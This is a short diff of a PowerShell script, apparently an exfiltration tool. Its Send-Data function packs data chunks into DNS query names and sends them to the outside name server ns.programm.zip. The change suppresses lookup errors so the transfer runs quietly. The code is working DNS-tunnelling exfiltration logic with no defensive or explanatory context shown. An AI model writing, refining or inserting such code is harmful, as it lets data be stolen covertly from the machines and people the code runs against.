@@ -20,7 +20,7 @@ function Send-Data {
         $dnsQuery = "$currentChunk.$query"
     
         # Send DNS query
-        $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip
+        $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip -ErrorAction Ignore
     
         if ($dnsResult) {
             # Never has a response ready, hopefully :-)
